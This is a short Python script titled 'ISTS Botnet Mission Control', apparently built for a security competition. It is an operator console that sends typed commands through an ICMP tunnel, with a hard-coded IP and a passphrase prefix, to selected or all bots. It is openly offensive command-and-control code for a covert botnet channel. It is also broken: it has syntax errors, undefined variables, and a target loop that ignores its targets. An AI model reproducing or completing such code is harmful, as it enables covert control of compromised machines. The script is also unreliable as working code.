from icmp_tunnel import *
from master_viewer import *
import sys
import Queue

def main():
	print(" - ISTS Botnet Mission Control - ")
    	print("\thelp - to list commands")
	targets = []
	while True:
		cmd = raw_input(">>>")
		if cmd.startswith("SET-TARGET")
			if cmd.split(":")[1] = "ALL":
				targets = activeBots
			else:
				targets = cmd.split(":")[1].split()
		for target in targets:
			send_icmp(localhost, "10.80.100.35", "OkayNowYouCanUseMe"+cmd)
		
		print(responseQueue.get(True,5))
		
if __name__ == "__main__":
    main()
